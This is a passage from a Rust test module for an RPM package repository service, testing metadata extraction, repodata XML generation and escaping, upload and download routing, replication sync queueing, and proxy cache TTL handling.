        );
        assert_eq!(meta["arch"], "noarch");
    }

    #[test]
    fn test_build_rpm_metadata_is_valid_json() {
        let meta = build_rpm_metadata("a", "b", "c", "d", "e");
        let s = serde_json::to_string(&meta).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert!(parsed.is_object());
    }

    // -----------------------------------------------------------------------
    // build_rpm_upload_response
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_rpm_upload_response_all_fields() {
        let resp = build_rpm_upload_response("pkg", "1.0", "1", "x86_64", "abc123", 1024);
        assert_eq!(resp["name"], "pkg");
        assert_eq!(resp["version"], "1.0");
        assert_eq!(resp["release"], "1");
        assert_eq!(resp["arch"], "x86_64");
        assert_eq!(resp["sha256"], "abc123");
        assert_eq!(resp["size"], 1024);
    }

    #[test]
    fn test_build_rpm_upload_response_zero_size() {
        let resp = build_rpm_upload_response("pkg", "1.0", "1", "noarch", "def", 0);
        assert_eq!(resp["size"], 0);
    }

    #[test]
    fn test_build_rpm_upload_response_large_size() {
        let resp = build_rpm_upload_response("big", "1.0", "1", "x86_64", "hash", 1_073_741_824);
        assert_eq!(resp["size"], 1_073_741_824i64);
    }

    // -----------------------------------------------------------------------
    // extract_rpm_filename
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_rpm_filename_from_content_disposition() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            HeaderValue::from_static("attachment; filename=my-pkg-1.0-1.x86_64.rpm"),
        );
        assert_eq!(
            extract_rpm_filename(&headers, b""),
            "my-pkg-1.0-1.x86_64.rpm"
        );
    }

    #[test]
    fn test_extract_rpm_filename_from_x_package_filename() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "X-Package-Filename",
            HeaderValue::from_static("custom-name.rpm"),
        );
        assert_eq!(extract_rpm_filename(&headers, b""), "custom-name.rpm");
    }

    #[test]
    fn test_extract_rpm_filename_fallback_to_hash() {
        let headers = HeaderMap::new();
        // sha256("") = e3b0c44298fc1c14...; the fallback name is the first 16 hex
        // chars of the body hash.
        let result = extract_rpm_filename(&headers, b"");
        assert_eq!(result, "e3b0c44298fc1c14.rpm");
    }

    #[test]
    fn test_extract_rpm_filename_content_disposition_priority() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            HeaderValue::from_static("attachment; filename=from-cd.rpm"),
        );
        headers.insert(
            "X-Package-Filename",
            HeaderValue::from_static("from-header.rpm"),
        );
        // Content-Disposition has priority
        assert_eq!(extract_rpm_filename(&headers, b""), "from-cd.rpm");
    }

    #[test]
    fn test_extract_rpm_filename_quoted_filename() {
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            HeaderValue::from_static("attachment; filename=\"quoted.rpm\""),
        );
        assert_eq!(extract_rpm_filename(&headers, b""), "quoted.rpm");
    }

    // -----------------------------------------------------------------------
    // XML generation helpers
    // -----------------------------------------------------------------------

    /// A fixed `updated_at` for artifact fixtures. Deliberately a constant and
    /// never `Utc::now()`: the repodata render must be a pure function of
    /// repository state, so a fixture that carried a clock reading would let
    /// the very bug these tests pin (#2636) slip back in unnoticed.
    fn test_updated_at() -> chrono::DateTime<chrono::Utc> {
        chrono::TimeZone::timestamp_opt(&chrono::Utc, 1_700_000_000, 0).unwrap()
    }

    #[test]
    fn test_generate_primary_xml_empty() {
        let xml = generate_primary_xml(&[]);
        assert!(xml.contains("packages=\"0\""));
        assert!(xml.contains("</metadata>"));
        assert!(xml.contains("xmlns=\"http://linux.duke.edu/metadata/common\""));
    }

    #[test]
    fn test_generate_primary_xml_with_artifact() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/test-1.0-1.x86_64.rpm".to_string(),
            name: "test".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/test-1.0-1.x86_64.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: Some(serde_json::json!({
                "name": "test",
                "version": "1.0",
                "release": "1",
                "arch": "x86_64",
            })),
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(xml.contains("packages=\"1\""));
        assert!(xml.contains("<name>test</name>"));
        assert!(xml.contains("ver=\"1.0\""));
        assert!(xml.contains("rel=\"1\""));
        assert!(xml.contains("<arch>x86_64</arch>"));
    }

    #[test]
    fn test_generate_primary_xml_escapes_special_chars() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/test-1.0-1.x86_64.rpm".to_string(),
            name: "test<pkg>".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 512,
            checksum_sha256: "def456".to_string(),
            storage_key: "rpm/1/test.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: Some(serde_json::json!({
                "name": "test<pkg>",
                "version": "1.0",
                "release": "1",
                "arch": "x86_64",
            })),
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(xml.contains("test&lt;pkg&gt;"));
    }

    // The <location href> must match the hosted download route (`packages/<file>`)
    // regardless of how the artifact was stored (native PUT vs. generic upload).
    #[test]
    fn test_generate_primary_xml_bare_path_location_prefixed() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "hello-1.0-1.x86_64.rpm".to_string(),
            name: "hello".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/hello.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(
            xml.contains(r#"<location href="packages/hello-1.0-1.x86_64.rpm"/>"#),
            "bare-path RPM must emit a packages/-prefixed href: {xml}"
        );
    }

    #[test]
    fn test_generate_primary_xml_nested_non_packages_path_uses_basename() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "some/nested/dir/hello-1.0-1.x86_64.rpm".to_string(),
            name: "hello".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/hello.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(
            xml.contains(r#"<location href="packages/hello-1.0-1.x86_64.rpm"/>"#),
            "nested non-packages path must map to packages/<basename>: {xml}"
        );
    }

    // -----------------------------------------------------------------------
    // build_rpm_artifact_metadata (#2588)
    // -----------------------------------------------------------------------

    /// Real minimal noarch RPM built with rpmbuild (Summary/License/URL/Group
    /// set, so header extraction has something to find).
    const TEST_RPM: &[u8] = include_bytes!("../../../tests/fixtures/ak-meta-test-1.0-1.noarch.rpm");

    #[test]
    fn test_build_rpm_artifact_metadata_extracts_header_fields() {
        let meta = build_rpm_artifact_metadata("ak-meta-test-1.0-1.noarch.rpm", TEST_RPM)
            .expect("not rejected")
            .expect("metadata for a real RPM");
        assert_eq!(meta["name"], "ak-meta-test");
        assert_eq!(meta["version"], "1.0");
        assert_eq!(meta["release"], "1");
        assert_eq!(meta["arch"], "noarch");
        assert_eq!(meta["filename"], "ak-meta-test-1.0-1.noarch.rpm");
        assert_eq!(meta["summary"], "Artifact Keeper metadata test package");
        assert_eq!(meta["license"], "MIT");
        assert_eq!(meta["url"], "https://artifact-keeper.example/test");
        assert_eq!(meta["source_rpm"], "ak-meta-test-1.0-1.src.rpm");
    }

    /// The header is authoritative: a filename that disagrees with the header
    /// must not override the header-derived NEVRA.
    #[test]
    fn test_build_rpm_artifact_metadata_header_wins_over_filename() {
        let meta = build_rpm_artifact_metadata("wrong-9.9-9.x86_64.rpm", TEST_RPM)
            .expect("not rejected")
            .expect("metadata for a real RPM");
        assert_eq!(meta["name"], "ak-meta-test");
        assert_eq!(meta["version"], "1.0");
        assert_eq!(meta["arch"], "noarch");
        // The stored filename still reflects what the client pushed.
        assert_eq!(meta["filename"], "wrong-9.9-9.x86_64.rpm");
    }

    /// Unparseable content with a NEVRA filename degrades to filename-derived
    /// fields (header-only fields absent), never an error.
    #[test]
    fn test_build_rpm_artifact_metadata_unparseable_content_uses_filename() {
        let meta = build_rpm_artifact_metadata("hello-2.10-1.el8.noarch.rpm", b"not an rpm")
            .expect("not rejected")
            .expect("filename-derived metadata");
        assert_eq!(meta["name"], "hello");
        assert_eq!(meta["version"], "2.10");
        assert_eq!(meta["release"], "1.el8");
        assert_eq!(meta["arch"], "noarch");
        assert!(meta.get("summary").is_none());
        assert!(meta.get("source_rpm").is_none());
    }

    /// No signal from either source -> no metadata row at all.
    #[test]
    fn test_build_rpm_artifact_metadata_no_signal_returns_none() {
        assert!(build_rpm_artifact_metadata("blob.bin", b"junk")
            .expect("not rejected")
            .is_none());
        assert!(build_rpm_artifact_metadata("bad.rpm", b"junk")
            .expect("not rejected")
            .is_none());
    }

    /// primary.xml must surface the header-derived format metadata (#2588):
    /// description/url plus the <format> block dnf's `Source:` field reads.
    #[test]
    fn test_generate_primary_xml_emits_format_metadata() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/test-1.0-1.x86_64.rpm".to_string(),
            name: "test".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/test-1.0-1.x86_64.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: Some(serde_json::json!({
                "name": "test",
                "version": "1.0",
                "release": "1",
                "arch": "x86_64",
                "summary": "A test package",
                "description": "Longer description",
                "url": "https://example.test",
                "license": "MIT",
                "source_rpm": "test-1.0-1.src.rpm",
            })),
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(xml.contains("<summary>A test package</summary>"), "{xml}");
        assert!(
            xml.contains("<description>Longer description</description>"),
            "{xml}"
        );
        assert!(xml.contains("<url>https://example.test</url>"), "{xml}");
        assert!(xml.contains("<rpm:license>MIT</rpm:license>"), "{xml}");
        assert!(
            xml.contains("<rpm:sourcerpm>test-1.0-1.src.rpm</rpm:sourcerpm>"),
            "{xml}"
        );
    }

    /// Artifacts recorded before header extraction existed keep rendering
    /// (fields blank, not an error).
    #[test]
    fn test_generate_primary_xml_blank_format_fields_without_metadata() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/hello-1.0-1.x86_64.rpm".to_string(),
            name: "hello".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/hello.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(xml.contains("<rpm:license></rpm:license>"), "{xml}");
        assert!(xml.contains("<rpm:sourcerpm></rpm:sourcerpm>"), "{xml}");
    }

    // Regression pin: a native `packages/`-prefixed path must be emitted
    // byte-for-byte identically (no double-prefixing, no rewrite).
    #[test]
    fn test_generate_primary_xml_native_packages_path_location_identical() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/hello-1.0-1.x86_64.rpm".to_string(),
            name: "hello".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/hello.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(
            xml.contains(r#"<location href="packages/hello-1.0-1.x86_64.rpm"/>"#),
            "native packages/ path must be emitted verbatim: {xml}"
        );
        assert!(
            !xml.contains("packages/packages/"),
            "native packages/ path must not be double-prefixed: {xml}"
        );
    }

    // xml_escape must still apply to the computed location.
    #[test]
    fn test_generate_primary_xml_location_is_xml_escaped() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "weird&name-1.0-1.x86_64.rpm".to_string(),
            name: "weird".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 1024,
            checksum_sha256: "abc123".to_string(),
            storage_key: "rpm/1/weird.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        assert!(
            xml.contains(r#"<location href="packages/weird&amp;name-1.0-1.x86_64.rpm"/>"#),
            "location must be xml-escaped: {xml}"
        );
    }

    #[test]
    fn test_generate_filelists_xml_empty() {
        let xml = generate_filelists_xml(&[]);
        assert!(xml.contains("packages=\"0\""));
        assert!(xml.contains("</filelists>"));
    }

    #[test]
    fn test_generate_filelists_xml_with_artifact() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/hello-1.0-1.noarch.rpm".to_string(),
            name: "hello".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 256,
            checksum_sha256: "sha256hash".to_string(),
            storage_key: "rpm/1/hello.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: Some(serde_json::json!({
                "name": "hello",
                "version": "1.0",
                "release": "1",
                "arch": "noarch",
            })),
        }];
        let xml = generate_filelists_xml(&artifacts);
        assert!(xml.contains("packages=\"1\""));
        assert!(xml.contains("name=\"hello\""));
        assert!(xml.contains("arch=\"noarch\""));
    }

    #[test]
    fn test_generate_other_xml_empty() {
        let xml = generate_other_xml(&[]);
        assert!(xml.contains("packages=\"0\""));
        assert!(xml.contains("</otherdata>"));
    }

    #[test]
    fn test_generate_other_xml_with_artifact() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/util-2.0-3.el9.x86_64.rpm".to_string(),
            name: "util".to_string(),
            version: Some("2.0-3".to_string()),
            size_bytes: 4096,
            checksum_sha256: "otherhash".to_string(),
            storage_key: "rpm/1/util.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: Some(serde_json::json!({
                "name": "util",
                "version": "2.0",
                "release": "3.el9",
                "arch": "x86_64",
            })),
        }];
        let xml = generate_other_xml(&artifacts);
        assert!(xml.contains("packages=\"1\""));
        assert!(xml.contains("name=\"util\""));
    }

    #[test]
    fn test_generate_updateinfo_xml() {
        let xml = generate_updateinfo_xml();
        assert!(xml.contains("<updates></updates>"));
        assert!(xml.contains("<?xml version=\"1.0\""));
    }

    #[test]
    fn test_generate_repomd_xml_content_empty() {
        let xml = generate_repomd_xml_content(&[]);
        assert!(xml.contains("<repomd"));
        assert!(xml.contains("</repomd>"));
        assert!(xml.contains("type=\"primary\""));
        assert!(xml.contains("type=\"filelists\""));
        assert!(xml.contains("type=\"other\""));
        assert!(xml.contains("type=\"updateinfo\""));
        assert!(xml.contains("checksum type=\"sha256\""));
    }

    #[test]
    fn test_generate_repomd_xml_content_has_sizes() {
        let xml = generate_repomd_xml_content(&[]);
        assert!(xml.contains("<size>"));
    }

    // -----------------------------------------------------------------------
    // Primary XML with no metadata falls back to filename parsing
    // -----------------------------------------------------------------------

    #[test]
    fn test_generate_primary_xml_no_metadata_fallback() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/curl-7.88.1-8.el9.x86_64.rpm".to_string(),
            name: "curl".to_string(),
            version: Some("7.88.1-8".to_string()),
            size_bytes: 2048,
            checksum_sha256: "fallbackhash".to_string(),
            storage_key: "rpm/1/curl.rpm".to_string(),
            updated_at: test_updated_at(),
            metadata: None,
        }];
        let xml = generate_primary_xml(&artifacts);
        // Falls back to parse_rpm_filename from the path
        assert!(xml.contains("<name>curl</name>"));
        assert!(xml.contains("ver=\"7.88.1\""));
    }

    // -----------------------------------------------------------------------
    // DB-backed router tests for the proxy_helpers-call paths.
    // -----------------------------------------------------------------------

    use crate::api::handlers::test_db_helpers as tdh;

    #[tokio::test]
    async fn test_rpm_download_404_when_missing() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_anon(super::router());
        let (status, _) = tdh::send(
            app,
            tdh::get(format!("/{}/packages/missing-1.0-1.x86_64.rpm", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_download_serves_local() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let repo = f.repo_info("local", None);
        tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            "rpm/curl/7.88.1/curl-7.88.1-1.x86_64.rpm",
            "curl/7.88.1/curl-7.88.1-1.x86_64.rpm",
            "curl",
            "7.88.1",
            "application/x-rpm",
            bytes::Bytes::from_static(b"rpm-bytes"),
            f.user_id,
        )
        .await;

        let app = f.router_anon(super::router());
        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/packages/curl-7.88.1-1.x86_64.rpm", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(&body[..], b"rpm-bytes");
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_upload_unauthenticated_401() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_anon(super::router());
        let req = tdh::put(
            format!("/{}/packages/foo-1.0-1.x86_64.rpm", f.repo_key),
            bytes::Bytes::from_static(b"data"),
        );
        let (status, _) = tdh::send(app, req).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED);
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_upload_remote_405() {
        let Some(f) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };
        let app = f.router_with_auth(super::router());
        let req = tdh::put(
            format!("/{}/packages/foo-1.0-1.x86_64.rpm", f.repo_key),
            bytes::Bytes::from_static(b"data"),
        );
        let (status, _) = tdh::send(app, req).await;
        assert_eq!(status, StatusCode::METHOD_NOT_ALLOWED);
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_upload_succeeds_for_local() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_with_auth(super::router());
        let body: Vec<u8> = vec![0u8; 32];
        let req = tdh::put(
            format!("/{}/packages/curl-8.0.1-1.x86_64.rpm", f.repo_key),
            bytes::Bytes::from(body),
        );
        let (status, _) = tdh::send(app, req).await;
        assert!(
            status == StatusCode::OK || status == StatusCode::CREATED,
            "got {}",
            status
        );
        f.teardown().await;
    }

    /// #4725: an RPM upload to a hosted repository must queue a push sync task
    /// for a subscribed push peer, and an upload that arrives as peer
    /// replication must not be fanned back out. Fails on `main` (nothing queued).
    #[tokio::test]
    async fn rpm_upload_queues_push_sync_task_4725() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let peer_id = tdh::subscribe_push_peer(&f.pool, f.repo_id, "rpm").await;

        let body: Vec<u8> = vec![0u8; 32];
        let req = tdh::put(
            format!("/{}/packages/repl-rpm-1.0-1.noarch.rpm", f.repo_key),
            bytes::Bytes::from(body.clone()),
        );
        let (status, resp) = tdh::send(f.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "rpm upload must succeed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        // A replicated upload (as the sync worker sends it) stores the package
        // but must not queue another task.
        let mut req = tdh::put(
            format!("/{}/packages/repl-rpm-2.0-1.noarch.rpm", f.repo_key),
            bytes::Bytes::from(body),
        );
        req.headers_mut().insert(
            "x-artifact-keeper-replication",
            axum::http::HeaderValue::from_static("true"),
        );
        let (status, resp) = tdh::send(f.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "replicated rpm upload must succeed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let queued = tdh::queued_push_paths(&f.pool, peer_id, f.repo_id).await;
        tdh::delete_push_peer(&f.pool, peer_id).await;
        f.teardown().await;
        assert_eq!(
            queued,
            vec!["packages/repl-rpm-1.0-1.noarch.rpm".to_string()],
            "only the client upload queues a push task; the replicated one must not"
        );
    }

    /// #4792: the nested-layout (`repodata_depth > 0`) branch of `store_rpm`
    /// goes through `ArtifactService`, which queued push sync tasks even for a
    /// peer replication write. A client upload queues; a replicated one must
    /// not. Fails on `main` (both uploads queued).
    #[tokio::test]
    async fn rpm_nested_upload_skips_queue_for_replication_4792() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let mut conn = f.pool.acquire().await.unwrap();
        crate::services::rpm_layout::set_depth(&mut conn, f.repo_id, 1)
            .await
            .unwrap();
        drop(conn);
        let peer_id = tdh::subscribe_push_peer(&f.pool, f.repo_id, "rpm-nested").await;

        let req = tdh::put(
            format!("/{}/build-a/repl-rpm-1.0-1.noarch.rpm", f.repo_key),
            bytes::Bytes::from_static(b"client rpm"),
        );
        let (status, resp) = tdh::send(f.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "nested rpm upload must succeed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let mut req = tdh::put(
            format!("/{}/build-a/repl-rpm-2.0-1.noarch.rpm", f.repo_key),
            bytes::Bytes::from_static(b"replicated rpm"),
        );
        req.headers_mut().insert(
            "x-artifact-keeper-replication",
            axum::http::HeaderValue::from_static("true"),
        );
        let (status, resp) = tdh::send(f.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "replicated nested rpm upload must succeed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let queued = tdh::queued_push_paths_settled(
            &f.pool,
            peer_id,
            f.repo_id,
            "build-a/repl-rpm-1.0-1.noarch.rpm",
        )
        .await;
        tdh::delete_push_peer(&f.pool, peer_id).await;
        f.teardown().await;
        assert_eq!(
            queued,
            vec!["build-a/repl-rpm-1.0-1.noarch.rpm".to_string()],
            "only the client upload queues a push task; the replicated one must not"
        );
    }

    #[tokio::test]
    async fn test_rpm_upload_invalid_filename_400() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_with_auth(super::router());
        let req = tdh::put(
            format!("/{}/packages/notarpm.txt", f.repo_key),
            bytes::Bytes::from_static(b"data"),
        );
        let (status, _) = tdh::send(app, req).await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        f.teardown().await;
    }

    // -----------------------------------------------------------------------
    // #1447: Remote RPM proxy must surface upstream repodata + packages.
    //
    // Prior to the fix, every /repodata/* handler called list_rpm_artifacts
    // and synthesized an empty repomd.xml from local rows, so dnf saw an
    // empty repo. These tests stand up a wiremock upstream, point a Remote
    // fixture at it, and drive the router end to end.
    // -----------------------------------------------------------------------

    /// Repoint the fixture's Remote repo at `upstream_url` and rebuild a
    /// SharedState that wires in a real ProxyService.
    async fn rewire_remote(
        fx: &tdh::Fixture,
        upstream_url: &str,
    ) -> (crate::api::SharedState, tempfile::TempDir) {
        sqlx::query("UPDATE repositories SET upstream_url = $1 WHERE id = $2")
            .bind(upstream_url)
            .bind(fx.repo_id)
            .execute(&fx.pool)
            .await
            .expect("update upstream_url");
        // Use a fresh tmp dir for the proxy cache so concurrent tests do
        // not collide on cache_storage_key paths.
        let dir = tempfile::tempdir().expect("tempdir");
        let proxy = tdh::build_proxy_service_with_fs(fx.pool.clone(), dir.path().to_str().unwrap());
        let state =
            tdh::build_state_with_proxy(fx.pool.clone(), dir.path().to_str().unwrap(), proxy);
        (state, dir)
    }

    #[tokio::test]
    async fn test_rpm_remote_repomd_proxies_upstream_xml() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let server = MockServer::start().await;
        let upstream_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
<repomd xmlns="http://linux.duke.edu/metadata/repo">
  <data type="primary">
    <location href="repodata/abc123-primary.xml.gz"/>
  </data>
</repomd>"#;
        Mock::given(method("GET"))
            .and(path("/repodata/repomd.xml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/xml")
                    .set_body_bytes(upstream_xml.as_ref()),
            )
            .mount(&server)
            .await;

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let app = tdh::router_anon(super::router(), state);

        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/repomd.xml", fx.repo_key)),
        )
        .await;

        let teardown = || async { fx.teardown().await };
        if status != StatusCode::OK {
            teardown().await;
            panic!("repomd.xml proxy returned {}", status);
        }
        let bytes: &[u8] = &body;
        assert_eq!(bytes, upstream_xml.as_ref());
        // Sanity check: the response must NOT be the empty-local-repo
        // template that the pre-fix handler used to emit.
        assert!(
            !std::str::from_utf8(bytes)
                .unwrap_or("")
                .contains("primary.xml.gz\"/>\n    <checksum"),
            "repomd.xml should be the upstream body, not the locally generated one"
        );
        teardown().await;
    }

    // -----------------------------------------------------------------------
    // #3556: proxy-cache TTL of Remote RPM content.
    //
    // Both RPM proxy arms used to hand `cache_classifier::classify` a
    // synthesized `RepositoryFormat::Generic`, which has no classifier arm, so
    // a `.rpm` package and a createrepo unique-filename — content that can
    // never change upstream — were stamped with the conservative 5-minute
    // mutable TTL and re-fetched from upstream every five minutes, forever.
    //
    // The assertions read the TTL the fetch WROTE into the cache sidecar.
    // `cache_classifier::classify(Rpm, "Packages/foo.rpm")` was already
    // `Immutable` before the fix and was simply never consulted with the RPM
    // format, so a classifier-level test passes with the bug fully intact.
    // -----------------------------------------------------------------------

    /// #3556. In ONE fixture, over BOTH arms this issue names:
    ///
    /// * `upstream_proxy` (`proxy_fetch_streaming_with_disposition_and_format`)
    ///   serving `Packages/<nevra>.rpm` — immutable;
    /// * `try_proxy_repodata`
    ///   (`proxy_fetch_streaming_with_cache_key_verified`) serving a
    ///   createrepo unique-filename `repodata/<sha256>-primary.xml.gz` —
    ///   immutable, and content-addressed, so the body is also digest-verified
    ///   before it is cached forever.
    ///
    /// The two `repomd.xml` requests are the mutable negative controls, one
    /// per arm. They travel the identical handler branch, helper and format and
    /// differ only in path shape, so a "cache every RPM path forever" change
    /// fails here — which is the unrecoverable direction: `evaluate`
    /// short-circuits `Immutable` to `Fresh` without consulting `expires_at`,
    /// and `repomd.xml` is the one file a yum repository rewrites in place.
    #[tokio::test]
    async fn test_rpm_remote_proxy_cache_ttl_is_format_classified_3556() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };
        tdh::publish_repo(&fx.pool, fx.repo_id).await;

        // A real createrepo unique-filename asserts its own body's SHA-256, and
        // `try_proxy_repodata` refuses to cache a body that does not match it.
        // Build the name from the body so the immutable arm and the digest gate
        // are exercised together, exactly as they are in production.
        let primary_gz: &[u8] = b"\x1f\x8b\x08mock-primary-xml-gz-3556";
        let primary_digest =
            crate::services::storage_service::StorageService::calculate_hash(primary_gz);
        let unique_primary = format!("repodata/{primary_digest}-primary.xml.gz");
        const PACKAGE: &str = "Packages/nginx-1.24.0-1.el9.x86_64.rpm";
        // The negative control on the CATCH-ALL arm: real yum layouts put
        // repodata under an arch prefix, so the mutable pointer reaches
        // `upstream_proxy` too, not only the dedicated `/repodata/` routes.
        const NESTED_REPOMD: &str = "el9/x86_64/repodata/repomd.xml";
        const ROOT_REPOMD: &str = "repodata/repomd.xml";

        let server = MockServer::start().await;
        for (p, ct, body) in [
            (
                PACKAGE,
                "application/x-rpm",
                b"mock-rpm-bytes-3556".to_vec(),
            ),
            (
                unique_primary.as_str(),
                "application/gzip",
                primary_gz.to_vec(),
            ),
            (NESTED_REPOMD, "application/xml", b"<repomd/>".to_vec()),
            (ROOT_REPOMD, "application/xml", b"<repomd/>".to_vec()),
        ] {
            Mock::given(method("GET"))
                .and(path(format!("/{p}")))
                .respond_with(
                    ResponseTemplate::new(200)
                        .insert_header("content-type", ct)
                        .set_body_bytes(body),
                )
                .mount(&server)
                .await;
        }

        let (state, dir) = rewire_remote(&fx, &server.uri()).await;
        for p in [PACKAGE, unique_primary.as_str(), NESTED_REPOMD, ROOT_REPOMD] {
            let app = tdh::router_anon(super::router(), state.clone());
            let (status, body) = tdh::send(app, tdh::get(format!("/{}/{p}", fx.repo_key))).await;
            assert_eq!(
                status,
                StatusCode::OK,
                "GET {p} must proxy 200 before its cache TTL means anything"
            );
            // Draining is what lets the streaming tee commit a sidecar to read.
            let _ = body.len();
        }

        let package_ttl = tdh::written_proxy_ttl_secs(dir.path(), &fx.repo_key, PACKAGE).await;
        let unique_primary_ttl =
            tdh::written_proxy_ttl_secs(dir.path(), &fx.repo_key, &unique_primary).await;
        let nested_repomd_ttl =
            tdh::written_proxy_ttl_secs(dir.path(), &fx.repo_key, NESTED_REPOMD).await;
        let root_repomd_ttl =
            tdh::written_proxy_ttl_secs(dir.path(), &fx.repo_key, ROOT_REPOMD).await;
        fx.teardown().await;

        let mutable = crate::services::cache_classifier::MUTABLE_DEFAULT_TTL_SECS;
        assert!(
            package_ttl >= tdh::IMMUTABLE_TTL_FLOOR_SECS,
            "a version-pinned `.rpm` can never change upstream and must be cached \
             as such; got {package_ttl}s — {mutable}s is the #3556 symptom (the \
             catch-all proxy arm handing the classifier a `Generic` format)"
        );
        assert!(
            unique_primary_ttl >= tdh::IMMUTABLE_TTL_FLOOR_SECS,
            "a createrepo unique-filename names its own content digest, so it is \
             content-addressed and immutable; got {unique_primary_ttl}s"
        );
        assert!(
            nested_repomd_ttl <= mutable,
            "`repomd.xml` is the one file a yum repository rewrites in place; it \
             must STAY mutable on the catch-all arm, got {nested_repomd_ttl}s — \
             this negative control is what keeps the immutable assertions from \
             passing under a 'cache every RPM path forever' change"
        );
        assert!(
            root_repomd_ttl <= mutable,
            "`repodata/repomd.xml` must stay mutable on the repodata arm too, \
             got {root_repomd_ttl}s"
        );
    }

    #[tokio::test]
    async fn test_rpm_remote_repodata_wildcard_proxies_hash_prefixed_path() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

